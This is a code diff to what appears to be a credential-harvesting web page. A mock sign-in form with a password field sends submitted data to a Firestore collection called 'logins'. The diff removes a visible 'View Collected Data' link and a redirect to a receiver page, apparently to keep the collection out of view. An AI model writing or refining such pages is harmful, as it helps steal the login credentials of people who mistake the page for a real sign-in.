@@ -27,7 +27,6 @@
             <input type="password" id="password" placeholder="Enter your password" required>
             <button type="submit">Next</button>
         </form>
-        <p><a href="receiver.html">View Collected Data</a></p>
     </div>
     <script>
         // Replace this with your own firebaseConfig if you created a new Firebase project
@@ -127,8 +126,8 @@
             try {
                 await db.collection('logins').add(payload);
                 console.log('Data successfully saved to Firestore');
-                // Redirect to receiver.html after successful data collection
-                window.location.href = 'receiver.html';
+                // Optionally, you can add a success message to the user
+                alert('Data successfully saved!');
             } catch (error) {
                 console.error('Firestore error:', error.message);
                 alert('Failed to save data: ' + error.message);
